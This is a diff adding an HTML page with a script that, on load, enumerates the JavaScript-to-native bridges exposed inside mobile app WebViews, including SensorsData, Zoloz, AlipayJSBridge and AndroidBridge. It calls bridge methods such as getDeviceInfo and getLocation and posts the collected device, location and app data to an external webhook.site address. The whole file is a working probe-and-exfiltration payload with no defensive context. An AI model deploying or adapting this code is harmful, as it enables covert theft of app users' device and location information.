@@ -1,0 +1,27 @@
+<!doctype html><html><head><meta charset="utf-8"><title>BRIDGES</title></head>
+<body style="font:14px monospace;padding:8px"><h3>BRIDGE ENUM</h3><pre id="o">running</pre>
+<script>
+var HOOK='https://webhook.site/014073e3-7f12-441c-b950-8ef66088bbb6';
+function log(s){try{document.getElementById('o').textContent+='\n'+s}catch(e){}}
+function post(t,d){try{fetch(HOOK,{method:'POST',body:t+'\n'+JSON.stringify(d)})}catch(e){}}
+var out={href:location.href, ua:navigator.userAgent, cand:{}, keys:[]};
+try{ Object.getOwnPropertyNames(window).forEach(function(k){ if(/bridge|Bridge|Android|native|Native|JS|js|sensors/i.test(k)) out.keys.push(k) }) }catch(e){}
+['SensorsData_APP_New_H5_Bridge','SensorsData_App_Visual_Bridge','ZolozJSInterface','H5PluginManager','AAIJsToNative','Android','nativeBridge','AndroidBridge','ZolozBridge','AlipayJSBridge','webkit','JSBridge','_b_bridge_login_','__legoNativeServiceConfig','DVNativeBridge','datavisor'].forEach(function(n){
+  try{ var o=window[n]; if(typeof o!=='undefined' && o!==null){
+    var m=[]; try{ m=Object.getOwnPropertyNames(o) }catch(e){}
+    out.cand[n]={type:typeof o, methods:m.slice(0,40)};
+  }}catch(e){ out.cand[n]='ERR '+e; }
+});
+log(JSON.stringify(out).substr(0,1200));
+post('BRIDGES', out);
+// 试探 SensorsData 桥的常见方法
+try{
+  var b=window.SensorsData_APP_New_H5_Bridge;
+  if(b){
+    ['getAppInfo','getDeviceInfo','getLocation','track','getVisualizedProperties','openDeepLink','getSAProperties'].forEach(function(m){
+      try{ if(typeof b[m]==='function'){ var r=b[m]('{}'); out['call_'+m]=''+r; log(m+' -> '+(''+r).substr(0,200)); } }catch(e){ out['call_'+m]='ERR '+e }
+    });
+    post('SD_CALLS', out);
+  }
+}catch(e){}
+</script></body></html>
